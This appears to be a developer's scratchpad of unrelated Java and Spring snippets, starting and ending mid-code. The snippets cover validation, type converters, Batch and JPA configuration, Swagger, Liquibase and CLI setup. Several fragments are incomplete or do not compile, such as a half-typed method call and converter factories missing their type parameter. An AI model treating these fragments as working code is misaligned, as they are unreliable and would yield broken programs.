            } else if (number > max2) {
                max2 = number;
            }
        }

        System.out.println("Given integer array : " + Arrays.toString(numbers));
        System.out.println("First maximum number is : " + max1);
        System.out.println("Second maximum number is : " + max2);
    }

}
--------------------------------------------------------------------------------------------------------
public class User {

  @NotNull(message="Имя должно быть задано")
  String firstname;

  @NotNull(message="Фамилия должна быть задана")
  @Size(min = 3, message="Длина фамилии должна быть больше трех")
  String lastname;

  @NotNull(message="Имэйл должен быть задан")
  @Pattern(regexp = "^(?:[a-zA-Z0-9_'^&/+-])+(?:\\.(?:[a-zA-Z0-9_'^&/+-])+)" +
      "*@(?:(?:\\[?(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))\\.)" +
      "{3}(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\]?)|(?:[a-zA-Z0-9-]+\\.)" +
      "+(?:[a-zA-Z]){2,}\\.?)$",
      message = "заданный имэйл не может существовать")
  String email;

  @Override
  public String toString() {
    return String.format("firstname: [%s], lastname: [%s], email: [%s]",
        firstname, lastname, email);
  }

  public static void validate(Object object, Validator validator) {
    Set<ConstraintViolation<Object>> constraintViolations = validator
        .validate(object);
    
    System.out.println(object);
    System.out.println(String.format("Кол-во ошибок: %d",
        constraintViolations.size()));
    
    for (ConstraintViolation<Object> cv : constraintViolations)
      System.out.println(String.format(
          "Внимание, ошибка! property: [%s], value: [%s], message: [%s]",
          cv.getPropertyPath(), cv.getInvalidValue(), cv.getMessage()));
  }
--------------------------------------------------------------------------------------------------------
public class FooBeanInfo extends SimpleBeanInfo {

    public PropertyDescriptor[] getPropertyDescriptors() {
        try {
            final PropertyEditor numberPE = new CustomNumberEditor(Integer.class, true);
            PropertyDescriptor ageDescriptor = new PropertyDescriptor("age", Foo.class) {
                public PropertyEditor createPropertyEditor(Object bean) {
                    return numberPE;
                };
            };
            return new PropertyDescriptor[] { ageDescriptor };
        }
        catch (IntrospectionException ex) {
            throw new Error(ex.toString());
        }
    }
}
--------------------------------------------------------------------------------------------------------
final var strategy = create(IntStream.range(0, 1_000_000).mapToObj(Integer::toString).collect(toList()));
--------------------------------------------------------------------------------------------------------
IncompatibleModifiers
--------------------------------------------------------------------------------------------------------
import lombok.RequiredArgsConstructor;
import org.springframework.beans.TypeConverter;
import org.springframework.core.convert.ConversionService;

import java.util.Objects;

@RequiredArgsConstructor
public class Converter {
    private final ConversionService conversionService;
    private final TypeConverter typeConverter;

    public <E> E convert(final Object value, final Class<E> targetType) {
        if (Objects.nonNull(this.conversionService)) {
            return this.conversionService.convert(value, targetType);
        }
        return this.typeConverter.convertIfNecessary(value, targetType);
    }
}

--------------------------------------------------------------------------------------------------------
import org.springframework.core.convert.converter.Converter;
import org.springframework.core.convert.converter.ConverterFactory;

public class ArticleToStringConverterFactory implements ConverterFactory<Article, String>{

	@SuppressWarnings("unchecked")
	@Override
	public  Converter<Article, T> getConverter(Class arg0) {
		return (Converter<Article, T>)new ArticleToStringConverter();
	}

}

import org.springframework.core.convert.converter.Converter;
import org.springframework.core.convert.converter.ConverterFactory;

public class StringToArticleConverterFactory implements ConverterFactory<String, Article>{

	@SuppressWarnings("unchecked")
	@Override
	public  Converter<String, T> getConverter(Class arg0) {
		return (Converter<String, T>) new StringToArticleConverter();
	}
}


		GenericConversionService conversionService = new GenericConversionService();

		conversionService.addConverterFactory(new ArticleToStringConverterFactory());
		conversionService.addConverterFactory(new StringToArticleConverterFactory());
		
		
--------------------------------------------------------------------------------------------------------
public class CustomerValidator implements Validator {

    private final Validator addressValidator;

    public CustomerValidator(Validator addressValidator) {
        if (addressValidator == null) {
            throw new IllegalArgumentException("The supplied [Validator] is " +
                "required and must not be null.");
        }
        if (!addressValidator.supports(Address.class)) {
            throw new IllegalArgumentException("The supplied [Validator] must " +
                "support the validation of [Address] instances.");
        }
        this.addressValidator = addressValidator;
    }

    /**
     * This Validator validates Customer instances, and any subclasses of Customer too
     */
    public boolean supports(Class clazz) {
        return Customer.class.isAssignableFrom(clazz);
    }

    public void validate(Object target, Errors errors) {
        ValidationUtils.rejectIfEmptyOrWhitespace(errors, "firstName", "field.required");
        ValidationUtils.rejectIfEmptyOrWhitespace(errors, "surname", "field.required");
        Customer customer = (Customer) target;
        try {
            errors.pushNestedPath("address");
            ValidationUtils.invokeValidator(this.addressValidator, customer.getAddress(), errors);
        } finally {
            errors.popNestedPath();
        }
    }
}
--------------------------------------------------------------------------------------------------------
@EnableWebMvc
@Configuration
public class WebConfig extends WebMvcConfigurerAdapter {

    @Override
    protected void addFormatters(FormatterRegistry registry) {
        registry.addConverter(new StringToCategory());
        registry.addConverter(new CategoryToString());
    }

}
--------------------------------------------------------------------------------------------------------
@Configuration
@ComponentScan("com.XXXX")
@EnableBatchProcessing
@EnableScheduling
@PropertySource("classpath:database.properties")
@ImportResource({ "classpath:jobs/XYZ.xml"})
public class CommonConfig {
    @Bean
    BatchConfigurer configurer(@Qualifier("dataSource") DataSource dataSource) {
        return new DefaultBatchConfigurer(dataSource);
    }
}

@Configuration
@EnableTransactionManagement
@ComponentScan({ "com.XXX" })
@EnableJpaRepositories(basePackages = {"com.XX.repository", "com.XX.custom.repository"}, 
                        entityManagerFactoryRef = "entityManagerFactory", 
                        transactionManagerRef = "transactionManager")
public class DatabaseConfig {
    @Bean
    @Primary
    @ConfigurationProperties("abc.datasource")
    public DataSourceProperties dataSourceProperties() {
        return new DataSourceProperties();
    }

    @Primary
    @Bean(name = "dataSource")
    @ConfigurationProperties(prefix = "abc.datasource")
    public DataSource dataSource() {
        return dataSourceProperties().initializeDataSourceBuilder().build();
    }

    @Primary
    @Bean(name = "entityManagerFactory")
    public LocalContainerEntityManagerFactoryBean entityManagerFactory(@Qualifier("dataSource") DataSource dataSource) {

        LocalContainerEntityManagerFactoryBean em = new LocalContainerEntityManagerFactoryBean();
        em.setDataSource(dataSource);
        em.setPackagesToScan(new String[] { "com.XX.Entity" });
        em.setPersistenceUnitName("devcloud");

        JpaVendorAdapter vendorAdapter = new HibernateJpaVendorAdapter();
        em.setJpaVendorAdapter(vendorAdapter);
        return em;
    }

    @Primary
    @Bean(name = "transactionManager")
    public PlatformTransactionManager transactionManager(@Qualifier("entityManagerFactory") EntityManagerFactory entityManagerFactory) {
        return new JpaTransactionManager(entityManagerFactory);
    }
}

public class BillingConfig implements BatchConfigurer{

    private PlatformTransactionManager transactionManager;
    private JobRepository jobRepository;
    private JobLauncher jobLauncher;
    private JobExplorer jobExplorer;

    @Override
    public JobRepository getJobRepository() {
        return jobRepository;
    }

    @Override
    public PlatformTransactionManager getTransactionManager() {
        return transactionManager;
    }

    @Override
    public JobLauncher getJobLauncher() throws JobExecutionAlreadyRunningException, JobRestartException, JobInstanceAlreadyCompleteException, JobParametersInvalidException {
        return jobLauncher;
    }

    @Override
    public JobExplorer getJobExplorer() {
        return jobExplorer;
    }

    @PostConstruct
    void initialize() throws Exception {
        if (this.transactionManager == null) {
            this.transactionManager = new ResourcelessTransactionManager();
        }

        // A FactoryBean that automates the creation of a SimpleJobRepository using non-persistent in-memory DAO implementations. 
        MapJobRepositoryFactoryBean jobRepositoryFactory = new MapJobRepositoryFactoryBean(this.transactionManager);
        jobRepositoryFactory.afterPropertiesSet();
        this.jobRepository = jobRepositoryFactory.getObject();

        // A FactoryBean that automates the creation of a SimpleJobRepository using non-persistent in-memory DAO implementations. 
        MapJobExplorerFactoryBean jobExplorerFactory = new MapJobExplorerFactoryBean(jobRepositoryFactory);
        jobExplorerFactory.afterPropertiesSet();
        this.jobExplorer = jobExplorerFactory.getObject();
        this.jobLauncher = createJobLauncher();
    }

    private JobLauncher createJobLauncher() throws Exception {
        SimpleJobLauncher simpleJobLauncher = new SimpleJobLauncher();
        simpleJobLauncher.setJobRepository(jobRepository);
        simpleJobLauncher.afterPropertiesSet();
        return simpleJobLauncher;
    }
}

@Bean
BatchConfigurer configurer(@Qualifier("dataSource") DataSource dataSource, PlatformTransactionManager transactionManager) {
    return new DefaultBatchConfigurer(dataSource) {
        @Override
        protected JobRepository createJobRepository() throws Exception {
            JobRepositoryFactoryBean factory = new JobRepositoryFactoryBean();
            factory.setDataSource(dataSource);
            factory.setTransactionManager(transactionManager);
            factory.setSerializer(new XStreamExecutionContextStringSerializer());
            factory.afterPropertiesSet();
            return factory.getObject();
        }
    };
}
--------------------------------------------------------------------------------------------------------
   @Id
    @Column(name = "id")
    @SequenceGenerator(name = "general_seq", sequenceName = "generalSequenceGenerator")
    @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "general_seq")
    public Long getId() {
        return id;
    }
--------------------------------------------------------------------------------------------------------
CustomEditorConfigurer editorConfigurer = new CustomEditorConfigurer();
Map<String, PropertyEditor> customEditors = new HashMap<String, PropertyEditor>();
customEditors.put(Date.class.getName(), new DateEditor());
editorConfigurer.setCustomEditors(customEditors);

   @Bean
    public ConversionServiceFactoryBean conversionServiceFactoryBean() {
final ConversionServiceFactoryBean conversionServiceFactoryBean = new ConversionServiceFactoryBean();
        conversionServiceFactoryBean.ad
    }
--------------------------------------------------------------------------------------------------------
<h1>Hey, there’s an SVG image below me!</h1>
<svg viewBox="0 0 100 100">
   <rect x="10" y="10" width="100" height="100" />
   <!-- and all the shapes you need! —>
</svg>
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.ansi.AnsiOutput;
import org.springframework.boot.ansi.AnsiOutput.Enabled;
import org.springframework.boot.context.event.ApplicationEnvironmentPreparedEvent;
import org.springframework.boot.context.properties.bind.Binder;
import org.springframework.context.ApplicationListener;
import org.springframework.core.Ordered;
import org.springframework.core.env.ConfigurableEnvironment;

/**
* An {@link ApplicationListener} that configures {@link AnsiOutput} depending on the
* value of the property {@code spring.output.ansi.enabled}. See {@link Enabled} for valid
* values.
*
* @author Raphael von der Grün
* @author Madhura Bhave
* @since 1.2.0
*/
public class AnsiOutputApplicationListener
      implements ApplicationListener<ApplicationEnvironmentPreparedEvent>, Ordered {

   @Override
   public void onApplicationEvent(ApplicationEnvironmentPreparedEvent event) {
      ConfigurableEnvironment environment = event.getEnvironment();
      Binder.get(environment).bind("spring.output.ansi.enabled", AnsiOutput.Enabled.class)
            .ifBound(AnsiOutput::setEnabled);
      AnsiOutput.setConsoleAvailable(environment.getProperty("spring.output.ansi.console-available", Boolean.class));
   }

   @Override
   public int getOrder() {
      // Apply after ConfigFileApplicationListener has called EnvironmentPostProcessors
      return ConfigFileApplicationListener.DEFAULT_ORDER + 1;
   }

}
--------------------------------------------------------------------------------------------------------
$ sdk install springboot
$ spring --version
Spring Boot v2.1.9.RELEASE

$ sdk install springboot dev /path/to/spring-boot/spring-boot-cli/target/spring-boot-cli-2.1.9.RELEASE-bin/spring-2.1.9.RELEASE/
$ sdk default springboot dev
$ spring --version
Spring CLI v2.1.9.RELEASE

sdk ls springboot

$ brew tap pivotal/tap
$ brew install springboot

$ sudo port install spring-boot-cli

> scoop bucket add extras
> scoop install springboot

<dependency>
	<groupId>org.springframework.boot</groupId>
	<artifactId>spring-boot-properties-migrator</artifactId>
	<scope>runtime</scope>
</dependency>


mn --version

--------------------------------------------------------------------------------------------------------
package com.sensiblemetrics.api.common.actuator;

import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.boot.web.server.LocalServerPort;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.test.context.TestPropertySource;
import org.springframework.test.context.junit4.SpringRunner;

import java.util.Map;

import static org.assertj.core.api.BDDAssertions.then;

@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@TestPropertySource(properties = {"management.server.port=0"})
public class SpringActuatorApplicationTests {
    @LocalServerPort
    private int port;

    @Value("${local.management.port}")
    private int mgt;

    @Autowired
    private TestRestTemplate testRestTemplate;

    @Test
    public void shouldReturn200WhenSendingRequestToController() throws Exception {
        @SuppressWarnings("rawtypes")
        ResponseEntity<Map> entity = this.testRestTemplate.getForEntity("http://localhost:" + this.port + "/hello", Map.class);
        then(entity.getStatusCode()).isEqualTo(HttpStatus.OK);
    }

    @Test
    public void shouldReturn200WhenSendingRequestToManagementEndpoint() throws Exception {
        @SuppressWarnings("rawtypes")
        ResponseEntity<Map> entity = this.testRestTemplate
            .getForEntity("http://localhost:" + this.mgt + "/actuator/info", Map.class);
        System.out.println(this.mgt);
        then(entity.getStatusCode()).isEqualTo(HttpStatus.OK);
    }
}
--------------------------------------------------------------------------------------------------------
public class SportTypeEditorSupport extends PropertyEditorSupport {
 
    /**
     * Sets the property value by parsing a given String.  May raise
     * java.lang.IllegalArgumentException if either the String is
     * badly formatted or if this kind of property can't be expressed
     * as text.
     *
     * @param text  The string to be parsed.
     */
    @Override
    public void setAsText(String text) throws IllegalArgumentException {
        try{
            SportType sportType = SportType.getSport(Integer.parseInt(text));
            setValue(sportType);// setValue stores the custom type Object into a instance variable in PropertyEditorSupport.
        }
        catch(NumberFormatException nfe){
            throw new RuntimeException(nfe.getMessage());
        }
    }
 
     /**
     * Gets the property value as a string suitable for presentation
     * to a human to edit.
     *
     * @return The property value as a string suitable for presentation
     *       to a human to edit.
     * <p>   Returns "null" is the value can't be expressed as a string.
     * <p>   If a non-null value is returned, then the PropertyEditor should
     *       be prepared to parse that string back in setAsText().
     */
    @Override
    public String getAsText() {
        SportType sportType = (SportType)getValue();
        return Integer.toString(sportType.getId());
    }
}

import java.text.SimpleDateFormat;
import java.util.Date;
 
import org.springframework.beans.PropertyEditorRegistrar;
import org.springframework.beans.PropertyEditorRegistry;
import org.springframework.beans.propertyeditors.CustomDateEditor;
 
import com.pramati.model.SportType;
 
public class CustomPropertyEditorRegistrar implements PropertyEditorRegistrar {
    @Override
    public void registerCustomEditors(PropertyEditorRegistry registry) {
        registry.registerCustomEditor(Date.class, new CustomDateEditor(
                new SimpleDateFormat("dd-MM-yyyy"), true));
        registry.registerCustomEditor(SportType.class, new SportTypeEditorSupport());
    }
}

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.convert.ConversionService;
import org.springframework.validation.Validator;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.support.WebBindingInitializer;
import org.springframework.web.context.request.WebRequest;
 
public class CustomWebBindingInitializer implements WebBindingInitializer {
    @Autowired
    private CustomPropertyEditorRegistrar customPropertyEditorRegistrar;
 
    @Override
    public void initBinder(WebDataBinder binder, WebRequest request) {
        customPropertyEditorRegistrar.registerCustomEditors(binder);
    }
}



import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.convert.ConversionService;
import org.springframework.validation.Validator;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.support.WebBindingInitializer;
import org.springframework.web.context.request.WebRequest;
 
public class CustomWebBindingInitializer implements WebBindingInitializer {
 
    @Autowired
    private ConversionService conversionService;
 
    @Override
    public void initBinder(WebDataBinder binder, WebRequest request) {
        binder.setConversionService(conversionService);
    }
 
}

@Controller
@RequestMapping
@SessionAttributes("reservation")
public class ReservationFormController {
 
    private ReservationService reservationService;
    private ReservationValidator validator;
 
    @Autowired
    public ReservationFormController(ReservationService reservationService, ReservationValidator validator){
        this.reservationService = reservationService;
        this.validator = validator;
    }
 
    @Autowired
    private ConversionService conversionService;
    @InitBinder
    protected void initBinder(ServletRequestDataBinder binder) {
        binder.setConversionService(conversionService);
    }
 
    /*@InitBinder
    protected void initBinder(ServletRequestDataBinder binder) {
        binder.registerCustomEditor(Date.class, new CustomDateEditor(new SimpleDateFormat("dd-MM-yyyy"), true));
        binder.registerCustomEditor(SportType.class, new SportTypeEditorSupport(reservationService));
    }*/
 
    /*@Autowired
    private PropertyEditorRegistrar propertyEditorRegistrar;
    @InitBinder
    protected void initBinder(ServletRequestDataBinder binder) {
        propertyEditorRegistrar.registerCustomEditors(binder);
    }*/
 
    @ModelAttribute("sportTypes")
    public Iterable<SportType> getSportTypes(){
        return SportType.list();
    }
 
    @RequestMapping(value="/reservationForm/{userName}", method=RequestMethod.GET)
    public String initForm(Model model, @PathVariable String userName){
        Reservation reservation = new Reservation();
        reservation.setPlayer(new Player(userName, null));
        reservation.setSportType(SportType.TENNIS);
        model.addAttribute("reservation", reservation);
        return "reservationForm";
    }
 
    @RequestMapping(value="/reservationForm/{userName}",method=RequestMethod.POST)
    public String reserve(@Valid Reservation reservation, BindingResult bindingResult, SessionStatus sessionStatus){
        validator.validate(reservation, bindingResult);
        if(bindingResult.hasErrors()){
            return "/reservationForm";
        } else{
            reservationService.make(reservation);
            sessionStatus.setComplete();
            return "redirect:../reservationSuccess";
        }
    }
 
    @RequestMapping("/reservationSuccess")
    public void success(){
 
    }
}

@Configuration
public class ConversionServiceProvider
{
    @Autowired
    private MyConverterImpl myConverter;

    @Bean
    public ConversionService getConversionService()
    {
        ConversionServiceFactoryBean bean = new ConversionServiceFactoryBean();
        bean.setConverters( getConverters() );
        bean.afterPropertiesSet();
        ConversionService object = bean.getObject();
        return object;
    }

    private Set<Converter<?, ?>> getConverters()
    {
        Set<Converter<?, ?>> converters = new HashSet<Converter<?, ?>>();

        converters.add( myConverter );
        // add here more custom converters, either as spring bean references or directly instantiated

        return converters;
    }
}

public class MyFormattingConversionServiceFactoryBean extends FormattingConversionServiceFactoryBean {

    private Set<?> cachedConverters = new LinkedHashSet<>();

    @Override
    public void setConverters(Set<?> converters) {
        super.setConverters(converters);
        this.cachedConverters = new LinkedHashSet<>(converters);

    }

    @Override
    public void afterPropertiesSet() {
        super.afterPropertiesSet();
        FormattingConversionService conversionService = getObject();
        for (Object converter : cachedConverters) {
            if (converter instanceof ConversionServiceAware) {
                ((ConversionServiceAware) converter).setConversionService(conversionService);
            }
        }
    }
}

public class CustomerConversionServiceFactoryBean extends ConversionServiceFactoryBean {

    List<Converter<Object, Object>> converters = new ArrayList<>();

    public CustomerConversionServiceFactoryBean() {
        super();

    DefaultConversionService conversionservice = (DefaultConversionService)  super.getObject();

        for(int i=0;i<converters.size();i++){
            conversionservice.addConverter(converters.get(i));
        }
    }
}

Config methods may have an arbitrary name and any number of arguments; each of those arguments will be autowired with a matching bean in the Spring container. Bean property setter methods are effectively just a special case of such a general config method. Such config methods do not have to be public.

    @Configuration
    class MyConfig {

    @Autowired
    void conversionService(GenericConversionService genericConversionService) {
        genericConversionService.addConverter(String.class, UUID.class, UUID::fromString);
        genericConversionService.addConverter(String.class, DateTime.class, DateTime::parse);
        genericConversionService.addConverter(String.class, EnumState.class, EnumState::valueOf);
    }
}

<bean id="conversionService" class="org.springframework.context.support.ConversionServiceFactoryBean">
    <property name="converters">
        <set merge="true">
            <bean class="my.app.OptionConverter"/>
        </set>
    </property>
</bean>

  <mvc:annotation-driven conversion-service="conversionService"/>
--------------------------------------------------------------------------------------------------------
-Dspring.devtools.restart.enabled=false
--------------------------------------------------------------------------------------------------------
		defaults.addAll(JodaTimeConverters.getConvertersToRegister());
		defaults.addAll(Jsr310Converters.getConvertersToRegister());
		defaults.addAll(ThreeTenBackPortConverters.getConvertersToRegister());
--------------------------------------------------------------------------------------------------------
        final String dateTimePattern = "2014-05-02-10.45.05.993280-5:00";
        final DateTimeFormatter dateTimeFormatter = new DateTimeFormatterBuilder().appendPattern("yyyy-MM-dd-HH.mm.ss.SSSSSSZ").parseLenient().toFormatter();
        final OffsetDateTime expected = OffsetDateTime.parse(dateTimePattern, dateTimeFormatter);
        final byte[] source = {};
--------------------------------------------------------------------------------------------------------
export MAVEN_OPTS=-Xmx1024m
--------------------------------------------------------------------------------------------------------
$ java -Xdebug -Xrunjdwp:server=y,transport=dt_socket,address=8000,suspend=n \
       -jar target/myapplication-0.0.1-SNAPSHOT.jar
--------------------------------------------------------------------------------------------------------
assertThat(actual, hasItem(Matchers.<YourPojo>hasProperty("id", equalTo(1L))));
--------------------------------------------------------------------------------------------------------
//    @Bean
//    @ConditionalOnMissingBean
//    @ConditionalOnBean(Converter.class)
//    @Description("Default conversion service configuration bean")
//    public ConversionService conversionService(final List<Converter> converters) {
//        final DefaultConversionService conversionService = new DefaultConversionService();
//        converters.forEach(conversionService::addConverter);
//        return conversionService;
//    }
--------------------------------------------------------------------------------------------------------
        public EntityToBytesConverter() {
            ObjectMapper mapper = new ObjectMapper();
            mapper.setSerializationInclusion(JsonInclude.Include.NON_NULL);
            mapper.setSerializationInclusion(JsonInclude.Include.NON_EMPTY);
            mapper.setDefaultPropertyInclusion(JsonInclude.Include.NON_NULL);
            mapper.setDefaultPropertyInclusion(JsonInclude.Include.NON_EMPTY);

            SimpleBeanPropertyFilter theFilter = SimpleBeanPropertyFilter.serializeAllExcept("domainObject");
            FilterProvider filters = new SimpleFilterProvider().addFilter("myEntityFilter", theFilter);

            mapper.setFilters(filters);

            serializer = new GenericJackson2JsonRedisSerializer(mapper);
        }
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.test.context.TestConfiguration;
import org.springframework.boot.web.client.RestTemplateBuilder;
import org.springframework.context.annotation.Bean;

import java.time.Duration;

@TestConfiguration
public class TestConfig {

    @Bean
    public RestTemplateBuilder restTemplateBuilder() {

        return new RestTemplateBuilder()
                .basicAuthentication("mkyong", "password")
                .setConnectTimeout(Duration.ofSeconds(5));
    }
}
--------------------------------------------------------------------------------------------------------
configurations {
	developmentOnly
	runtimeClasspath {
		extendsFrom developmentOnly
	}
}
dependencies {
	developmentOnly("org.springframework.boot:spring-boot-devtools")
}
--------------------------------------------------------------------------------------------------------
curl -X POST \
-H "Consumer-Key: CONSUMER_KEY" \
-H "Consumer-Token: CONSUMER_TOKEN" \
-H "Content-Type: application/json" \
-H "Accept: application/json" \
-d '{"candidate": "grails", "version": "3.0.0", "hashtag": "grailsfw"}' \
https://vendors.sdkman.io/announce/struct
curl -X POST \
-H "Consumer-Key: CONSUMER_KEY" \
-H "Consumer-Token: CONSUMER_TOKEN" \
-H "Content-Type: application/json" \
-H "Accept: application/json" \
-d '{"text": "SDKMAN! 2.4.0 rolling out. Broadcast and Offline checks optimised."}' \
https://vendors.sdkman.io/announce/freeform
curl -X PUT \
-H "Consumer-Key: CONSUMER_KEY" \
-H "Consumer-Token: CONSUMER_TOKEN" \
-H "Content-Type: application/json" \
-H "Accept: application/json" \
-d '{"candidate": "groovy", "version": "2.3.8"}' \
https://vendors.sdkman.io/default

--------------------------------------------------------------------------------------------------------

    Execute Install-Module posh-gvm
    Execute Import-Module posh-gvm(best add it to your profile.ps1)
    Execute gvm help to get started!

--------------------------------------------------------------------------------------------------------
<plugin>
	<groupId>org.apache.maven.plugins</groupId>
	<artifactId>maven-compiler-plugin</artifactId>
	<configuration>
		<proc>none</proc>
	</configuration>
</plugin>
--------------------------------------------------------------------------------------------------------
java -jar myproject.jar --spring.config.name=myproject

app.name=MyApp
app.description=${app.name} is a Spring Boot application
https://docs.spring.io/spring-boot/docs/current/reference/html/configuration-metadata.html
--------------------------------------------------------------------------------------------------------
{
  "properties": [
    {
      "name": "kafka.consumer.auto-offset-reset",
      "type": "com.paragon.mailingcontour.commons.databus.enumeration.KafkaConsumerAutoOffsetResetType",
      "description": "Kafka Consumer auto-offset-reset option.",
      "sourceType": "com.paragon.mailingcontour.commons.databus.property.KafkaConsumerProperty"
    }
  ]
}
spring-configuration-metadata.json
    {
      "name": "kafka.consumer.auto-offset-reset",
      "type": "com.paragon.mailingcontour.commons.databus.enumeration.KafkaConsumerAutoOffsetResetType",
      "description": "Kafka Consumer auto-offset-reset option.",
      "sourceType": "com.paragon.mailingcontour.commons.databus.property.KafkaConsumerProperty"
    }
--------------------------------------------------------------------------------------------------------
spring init --dependencies=web --name=config-properties-demo --package-name=com.example.demo config-properties-demo
mvn spring-boot:run -Dspring.profiles.active=dev

export SPRING_PROFILES_ACTIVE=prod

# Packaging the app
mvn clean package -Dspring.profiles.active=staging

# Running the packaged jar with `spring.profiles.active` argument
java -jar -Dspring.profiles.active=staging target/config-properties-demo-0.0.1-SNAPSHOT.jar


# Logging pattern for the console
logging.pattern.console=%d{yyyy-MM-dd HH:mm:ss} - %msg%n
 
# Logging pattern for file
logging.pattern.file=%d{yyyy-MM-dd HH:mm:ss} [%thread] %-5level %logger{36} - %msg%n

	@DeprecatedConfigurationProperty(replacement = "app.acme.name")
	@Deprecated
--------------------------------------------------------------------------------------------------------
RealFactory factory     = new RealFactory();
RealFactory spy         = spy(factory);
TestedClass testedClass = new TestedClass(spy);

// At this point I would like to get a reference to the object created
// and returned by the factory.


// let's capture the return values from spy.create()
ResultCaptor<RealThing> resultCaptor = new ResultCaptor<>();
doAnswer(resultCaptor).when(spy).create();

// do something that will trigger a call to the factory
testedClass.doSomething();

// validate the return object
assertThat(resultCaptor.getResult())
        .isNotNull()
        .isInstanceOf(RealThing.class);
--------------------------------------------------------------------------------------------------------
    /**
     * Returns {@link LocalContainerEntityManagerFactoryBean} configuration
     *
     * @return {@link LocalContainerEntityManagerFactoryBean} configuration
     */
    @Bean
    @Primary
    @ConditionalOnMissingBean
    public LocalContainerEntityManagerFactoryBean entityManagerFactory(final DataSource dataSource) {
        final LocalContainerEntityManagerFactoryBean factoryBean = new LocalContainerEntityManagerFactoryBean();
        factoryBean.setDataSource(dataSource);
        factoryBean.setJpaVendorAdapter(this.jpaVendorAdapter());
        factoryBean.setJpaProperties(this.jpaProperties());
        factoryBean.setJpaDialect(this.jpaDialect());
        factoryBean.setPackagesToScan(DEFAULT_REPOSITORY_PACKAGE, DEFAULT_MODEL_PACKAGE);
        factoryBean.setPersistenceUnitName(DEFAULT_PERSISTENCE_UNIT_NAME);
        return factoryBean;
    }
--------------------------------------------------------------------------------------------------------
https://github.com/JakubStas?tab=repositories
https://evilinside.ru/php-2/

@Bean
public SwaggerSpringMvcPlugin customImplementation() {
    RelativeSwaggerPathProvider relativeSwaggerPathProvider = new RelativeSwaggerPathProvider(servletContext);
    AnnotationConfigWebApplicationContext context = (AnnotationConfigWebApplicationContext) applicationContext;
    if (context.getServletConfig() != null) {
        String path = context.getNamespace().replace("'", "").replace("-servlet", "").toLowerCase();
        relativeSwaggerPathProvider.setApiResourcePrefix(path);
    }
 
    return new SwaggerSpringMvcPlugin(this.springSwaggerConfig).ignoredParameterTypes(HttpSession.class)
            .includePatterns(".*?").pathProvider(relativeSwaggerPathProvider); // Scan everything
}
 
 
@PostConstruct
public void postSetup(){
    ModelConverters.addConverter(new AccessHiddenModelConverter(), true);
    FilterFactory.setFilter(new AccessHiddenSpecFilter());
}
 [ApiExplorerSettings(IgnoreApi = true)]
--------------------------------------------------------------------------------------------------------
/**
 * Updates users avatar.
 */
@PUT
@Path("/{userName}/avatar")
@Consumes(MediaType.MULTIPART_FORM_DATA)
@ApiImplicitParams(@ApiImplicitParam(dataType = "file", name = "avatar", paramType = "body"))
@ApiOperation(value = "Updates users avatar", notes = "Provides means to upload new versions of avatar based on username")
@ApiResponses(value = {
            @ApiResponse(code = 200, message = "Successful retrieval of users avatar", response = User.class),
            @ApiResponse(code = 404, message = "User with given username does not exist"),
            @ApiResponse(code = 500, message = "Internal server error") })
public Response updateUsersAvatar(@ApiParam(name = "userName", value = "Alphanumeric login to application", required = true) @PathParam("userName") String userName,
        @FormDataParam("avatar") InputStream avatarInputStream) {
    ...
}
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.context.embedded.ConfigurableEmbeddedServletContainer;
import org.springframework.boot.context.embedded.EmbeddedServletContainerCustomizer;
import org.springframework.context.annotation.Profile;
import org.springframework.stereotype.Component;
@Component
@Profile("prod")
public class ProdCustomizer implements EmbeddedServletContainerCustomizer {
	@Override
	public void customize(ConfigurableEmbeddedServletContainer container) {
		container.setContextPath("/spring-boot-prod");
		container.setPort(8585);
	}
} 
--------------------------------------------------------------------------------------------------------
<?xml version="1.0" encoding="utf-8"?>
<databaseChangeLog
    xmlns="http://www.liquibase.org/xml/ns/dbchangelog"
    xmlns:ext="http://www.liquibase.org/xml/ns/dbchangelog-ext"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.4.xsd
                        http://www.liquibase.org/xml/ns/dbchangelog-ext http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-ext.xsd">

    <property name="now" value="now()" dbms="h2"/>

    <property name="now" value="now()" dbms="mysql"/>
    <property name="autoIncrement" value="true"/>

    <property name="floatType" value="float4" dbms="postgresql, h2"/>
    <property name="floatType" value="float" dbms="mysql, oracle, mssql"/>

    <!--
        Added the entity Brand.
    -->
    <changeSet id="20170518145708-1" author="jhipster">
        <createTable tableName="brand">
            <column name="id" type="bigint" autoIncrement="${autoIncrement}">
                <constraints primaryKey="true" nullable="false"/>
            </column>
            <column name="name" type="varchar(255)">
                <constraints nullable="false" />
            </column>

            <column name="start_date" type="timestamp">
                <constraints nullable="true" />
            </column>

            <column name="user_id" type="bigint">
                <constraints nullable="true" />
            </column>

            <!-- jhipster-needle-liquibase-add-column - JHipster will add columns here, do not remove-->
        </createTable>
        <dropDefaultValue tableName="brand" columnName="start_date" columnDataType="datetime"/>
        
    </changeSet>
</databaseChangeLog>

<?xml version="1.0" encoding="utf-8"?>
<databaseChangeLog
    xmlns="http://www.liquibase.org/xml/ns/dbchangelog"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.4.xsd">
    <!--
        Added the constraints for entity Product.
    -->
    <changeSet id="20170518145709-2" author="jhipster">
        
        <addForeignKeyConstraint baseColumnNames="products_id"
